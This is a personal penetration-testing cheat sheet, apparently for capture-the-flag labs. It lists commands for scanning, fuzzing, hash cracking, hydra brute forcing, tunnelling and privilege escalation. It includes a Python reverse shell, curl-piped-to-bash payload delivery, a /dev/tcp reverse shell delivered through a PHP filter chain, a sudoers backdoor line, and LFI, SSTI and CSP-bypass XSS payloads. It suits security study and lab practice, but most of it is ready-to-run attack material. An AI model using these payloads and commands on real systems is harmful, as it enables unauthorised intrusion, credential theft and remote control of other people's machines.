# Common Commands/Techniques I Use Frequently (In no particular order)

Fave Resources
------
- https://swisskyrepo.github.io/PayloadsAllTheThings/
- https://exploit-notes.hdks.org/
- https://book.hacktricks.wiki/en/index.html
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://revshells.com
- https://github.com/artyuum/simple-php-web-shell
- https://pentestmonkey.net/category/cheat-sheet
- https://python2to3.com/
- https://regex-generator.olafneumann.org/

Misc
------
### Grep
- `grep -v` Inverse matching with grep
- `grep -E 'pattern1|pattern2' fileName_or_filePath` grp multiple patterns
- `sort -o outfile.txt -u infile.txt` Remove duplicates from infile.txt and write the remaining lines to outfile.txt
### Update Git Repos (recursive)
- `find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} git -C {} stash`
- `find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} git -C {} stash drop`
- `find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} git -C {} pull`
### Find Command
- `find / 2>/dev/null | grep desired_word`
### Searchsploit
- Copy the path to an exploit found using searchsploit to the clipboard (e.g. exploit 47010 in this case) `searchsploit -p 47010`
### Usually User-writable Folders
/tmp
/var/tmp

Enumeration
------
### Port Scanning
- `IP=x.x.x.x`
- `sudo masscan -p1-65535 $IP --rate=1000 -e tun0 > ports`
- `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
- `nmap -Pn -sVC -vv -p$ports $IP`
### Web Directory Fuzzing
- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://xxxxxx.xxx/FUZZ -fc 404,400 -fs 0`
- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://xxxxxx.xxx/assets/FUZZ -fc 404,400 -fs 0`
### Web File Fuzzing
- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://xxxxxx.xxx/assets/FUZZ -fc 404,400 -fs 0`
### Web Parameter Fuzzing for Host Command Injection
- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://xxxxxx.xxx/assets/index.php?FUZZ=id -fc 404,400 -fs 0`
### VHost Fuzzing
- `ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u https://test.url -H "Host: FUZZ.test.url"`
### Things to do on the Target Machine Once you Have a Foothold
- Run PEASS for the target OS (LinPEAS, WinPEAS etc.)
  - `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` Run linpeas from source if target machine has an Internet connection
- List listening ports on the machine `ss -ltn`
- List all files and folders including hidden ones in a directory `ls al`
- See if there is anything the current user can run as sudo `sudo -l`
- Look for SSH keys
- Check if AppArmor is active. If yes, check for bypasses (Like using a kernel library to load a shell `/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash`)
- Run pspy64 to check for running processes (Leave it running to see if any scheduled jobs are running etc.)
- Transfer and use busybox as required to fulfil missing executables

Encryption/Decryption
------
### PGP
- Add an encryption key you've found to the keyring `gpg --import x.key`
- Use aforemntioned key to decrypt a file `gpg x.pdf.gpg`
### SSH
- Generate SSH keys for a user `ssh-keygen -f username`
### Conversion of files to hashes (Once complete you may also have to remove the label at the beginning of each line for hashcat to recognise the hash)
- `ansible2john vaultname.vault > crackthis.hash`
- `keepass2john vaultname.kdb > crackthis.hash`
### Hash Cracking
- Search the hashcat help file for the type of hash you are trying to crack, in this example KeePass: `hashcat --help | grep -i "KeePass"` or check the hashcat example hashes table at https://hashcat.net/wiki/doku.php?id=example_hashes
- Crack an MD5 hash `hashcat -a 0 -m 0 -o cracked_output.txt --outfile-format 2 CrackThis.hash C:\wordlists\SecLists-2025.2\Passwords\Leaked-Databases\rockyou.txt`
- Crack an MD5(APR) hash `hashcat -a 0 -m 1600 ./hash /usr/share/wordlists/rockyou.txt`
- Crack a KeePass database hash `hashcat -a 0 -m 13400 -o cracked_output.txt --outfile-format 2 CrackThis.hash /usr/share/wordlists/rockyou.txt` or `hashcat -a 0 -m 13400 -o cracked_output.txt --outfile-format 2 CrackThis.hash C:\wordlists\SecLists-2025.2\Passwords\Leaked-Databases\rockyou.txt`
- Crack a SHA512crypt hash `hashcat -a 0 -m 1800 -o cracked_output.txt --outfile-format 2 CrackThis.hash C:\wordlists\SecLists-2025.2\Passwords\Leaked-Databases\rockyou.txt`
- Crack an Ansible vault pw hash `hashcat -a 0 -m 16900 -o cracked_output.txt --outfile-format 2 CrackThis.hash C:\wordlists\SecLists-2025.2\Passwords\Leaked-Databases\rockyou.txt`
- Crack a SHA512 salted hash in the format of hash:salt `hashcat -a 0 -m 1710 -o cracked_output.txt --outfile-format 2 CrackThis.hash C:\wordlists\SecLists-2025.2\Passwords\Leaked-Databases\rockyou.txt`
- Crack a JWT secret. Save the JWT to a text file called jwt.txt `hashcat -a 0 -m 16500 -o cracked_output.txt --outfile-format 2 jwt.txt C:\wordlists\jwt-secrets-list.txt`

Login Brute Forcing
------
### FTP
- Use lists created by RoomPrepper (The createLists.sh script takes the users and passwords from the notes.md file and creates these lists) `hydra -L user.lst -P password.lst ftp://x.x.x.x`
### SSH
- Use lists created by RoomPrepper (The createLists.sh script takes the users and passwords from the notes.md file and creates these lists) `hydra -L user.lst -P password.lst ssh://x.x.x.x -t 4 -vV`
### Web
- Using hydra with a captured request using the format `hydra -l <username> -P <password_wordlist> <machine_ip/hostname> <request_type> '<login_page>:<request_body>:<invalid_notification>'`\
so an example command is as follows `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.174.201 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=c7UvYlF%2FOoYdanjSx3HqFGCZ9ktcaqHpKyHHiKbVfNezx4JX%2BkvSkLj9IH9GbWF4z41mnESai4vX%2FkWm576GotEhS3W66Cvoz9as16iMPgK0d6yqjJHRpODyonGR2%2Fp3%2FIM8LcN%2Fr5X7zNiaYMnBzEAjp8eFYgBqjCVyUgoP2v7tqlHu&__EVENTVALIDATION=PknlTsjoXO2tIIQR4GG4BnQkewRFwQjxfpAKT06eOvI%2FL%2F07msVZ7JUQ4nBX7RAnbfZRdZ2%2B4gUl2BdBAuoEtbsQww69pvT2jUbpA%2F00YfgzuX8de4fjki4HfD4SDig3jJjMjZoQBLYOdW2Y%2B8W%2FTf17Bdd0hRBOzS%2BpvBmRWe0UIBx7&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vv`
- Using hydra with some parameters instead of the entire login request example `hydra -l milesdyson -P log1.txt 10.x.x.x http-post-form '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user`
- Using hydra to brute force a basic auth page `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt -s 80 -f enum.thm http-get /labs/basic_auth`

Easy Reverse Shell
------
- Copy python reverse shell into an index.html file, example contents `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'`
- Start a web server on your machine where you put the index.html file `python3 -m http.server 8000`
- Start a listener for the reverse shell `nc -nvlp 1337`
- Access the file by curl'ing the URL then pipe to bash in your vulnerable parameter/on the victim machine (e.g. payload for RCE: `curl 10.10.10.10:8000|bash`)

Upgrade Reverse Shell (To one that has autocomplete and won't be killed by Ctrl^C etc.)
------
### Using Python
1. In reverse shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. Press CTRL^Z to put the reverse shell in the background
3. In the host terminal (It should be at this stage now when the reverse shell has been backgrounded) `stty raw -echo; fg`
4. In the reverse shell that has now been foregrounded `echo TERM="xterm-256color"` followed by `reset` if required


Tunneling
------
### SSH
- Open an SSH session where all traffic to port 1111 on the target machine is forwarded to port 1111 on the attacking machine `ssh user@x.x.x.x -L 1111:localhost:1111`
### Chisel
1. Transfer chisel binary to target
2. Start chisel server on attacker machine `chisel server --reverse --port 9001`
3. On the target run `chisel client 10.x.x.x:9001 R:2049:127.0.0.1:2049`

Facilitation of File Transfers Between Attacker and Target
------
### Python web server
1. Start a simple web server from current working directory `python3 -m http.server 8000`
  - Download a file from aforementioned simple web server `wget http://10.x.x.x:8000/revsh.php` or `curl -O http://10.x.x.x:8000/chisel`
  - Run a file from aforementioned simple web server `curl http://10.x.x.x:8000/linpeas.sh | sh`

Steganography
------
### Using steghide
- `steghide extract -sf image.jpg`
### Using stegcracker
- `stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt`

Privilege Escalation
------
### Linux
#### /etc/sudoers
- `echo "$USER ALL=NOPASSWD: ALL" >> /etc/sudoers` Change $USER to the actual username if the variable doesn't work
#### Relative path exploitation
- If you find a script etc. that is running a binary without a defined absolute path you may be able to create your own script and give it the name of the binary
  - `echo "#!/bin/bash" > /tmp/id
    echo 'echo "uid=0(root) gid=0(root) groups=0(root)"' >> /tmp/id
    chmod 755 /tmp/id`
- Then add the path the binary resides in to the beginning of the PATH variable `export PATH=/tmp:$PATH`
- Your script should now be ran whenever the binary of the same name is called

Web App Testing
------
### XSS
The first thing to do is to look for parameters or input fields on the page, put your unique and easy to find test data in (And submit it or whatever) and then inspect the resultant page to see wher your test data has ended up in the code. Understanding the context where it ends up will determine what type of payload you'll need to use (Try things like closing the tag/variable that it ends up in and/or commenting out any code after the payload, bypassing filtering/escaping/CSP for example). 
Things to consider:
- Try different types of payloads to overcome filtering etc. For example the word javascript may be disallowed but you may be able to use an img tag.
- When dealing with an API, check the content type in the response headers. If its text/html as opposed to text/javascript etc. it could be susceptible to XSS. Send the request in a browser `(Visit https://myapi.com/check.php?username=ghostbugg)` and then do the usual to see if the html can be altered `(Try https://myapi.com/check.php?username=<u>ghostbugg for example)` etc.
- If your input ends up in a variable of a script or a span tag you can right click on the script tag in the browser dev tools to edit it as HTML to see how the input is interpreted.
- If attacking a markdown box, try and insert a hyperlink payload, eg. `[a](JaVaScRiPt:alert(1))` (https://github.com/cujanovic/Markdown-XSS-Payloads/tree/master) that will work with the implementation of markdown you are testing. If that doesn't work, try and implement an image payload,
eg. `![thisisalttext](https://somedomain.com/someimage.png"onerror=alert(1337);//)`
- For blind xss use https://xsshunter.trufflesecurity.com/app/#/ or your own instance (https://github.com/trufflesecurity/xsshunter). Also, in addition to the usual obvious places, think about the system you are testing and what type of information may be stored at the backend, eg. customer's user agent when placing an order, then use this to your advantage (eg. Intercept the order request and insert an XSS payload in the user agent header etc.)
#### Bypass types
- Special character or event handler smuggling
- Tag case sensitivity
- Multiple tag occurrences
- Using tags to split tags eg. `<scr<script>ipt>alert(1337)</sc</script>ript>`
- Open tags eg. `<img src=x onerror=alert(1337);//`
- Try less common ways to execute javascript if all script tags and event handlers are being filtered eg. iframe, a href, object
- JSONP bypass: Use JSONP callback functions to bypass CSP restrictions if possible (Look at script domains in the CSP and search for whether any callback functionality has been discovered that could be exploited. Some examples are Youtube embedding, Google recaptcha mechanism eg. `"><script/src=https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=vA5tgwEHPDs&callback=alert(1337)></script>` or `"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>` These payloads will need to be entered into the inpout field itself on the page and not the address bar. Further examples/scenarios listed at https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques
  Failing that, look at the target site itself and see if they have any exploitable JSONP functions eg. oauth etc.
- File upload bypass: Look for ways to upload a file to an allowed script domain in the CSP and be able to run it from there. For example: upload a profile picture, capture the request and add a .js extension and see if that's allowed, assuming it is then resend the request but delete the image data from the request payload and replace it with what you want the script contents to be. Then simply run the script from somewhere else using `<script/src=https://url_to_uploaded_script_file.js></script>`
#### Common Example Payloads in addition to any listed above
- `"/><u>ghostbugg` or just `"><u>ghostbugg` Initial test to see if we can add HTML to the page
- `;//` Javascript comment to stop any code after our payload being executed (Use only when required)
- `</textarea></script>"/><script>alert(1337)</script>` Reasonable first assumption payload if doing blind XSS
- `<script>alert(1337)</script>`
- `ghostbugg';alert(1337);//` Payload for scenario described above where our input ended up in a variable (Declared with apostrophes around it) within a script tag
- `<img src=xxxx onerror=alert(1337)>`
- `</textarea><img src=xxxx onmouseover=alert(1337)>`
- `<a href=javascript:alert(1337)>`
- `<iframe src=javascript:alert(1337)>`
- `<object data="data:text/html,<script>alert(1337)</script>"></object>`
- `<script src=data:text/javascript,alert(1337)></script>`
### PHP
#### Filters Chaining
- If you notice a parameter using PHP filters there's a chance it may be susceptible to RCE via filter chaining. Example URL `/secret-script.php?file=php://filter/resource=supersecretmessageforadmin`
- https://github.com/synacktiv/php_filter_chain_generator tool could be used to exploit it as follows:
  - First create a shell script named "revshell" on your local machine with the following contents, inserting your attacker machine IP address `bash -i >& /dev/tcp/x.x.x.x/4444 0>&1`
  - Use the aforementioned tool to create a chain payload, inserting your attacker machine IP address ```python3 php_filter_chain_generator.py --chain '<?= `curl -s -L x.x.x.x/revshell|bash` ?>``` (`<?= ?>` is shorthand for `<?php echo ~ ?>`)
  - Start a web server to host the revshell script and also start a netcat listener on the port specified in revshell
  - Execute the payload by requesting the following URL (the above vulnerable parameter has been used as an example) `/secret-script.php?file=<generated_chain>`
#### LFI
- LFI can be tested by submitting a request similar to `/secret-script.php?file=..//..//..//..//etc//passwd`
### SSTI
- On Twig version 2.14.0 or below with the sandbox mode enabled `{{['id',""]|sort('passthru')}}`
### Databases
#### MySQL
- `mysql -u [USERNAME]`
  - `show databases;`
  - `use [DATABASE];`
  - `show tables;`
  - `select * from [TABLE];`
  -	`SELECT LOAD_FILE('/home/username/myfile.txt');`
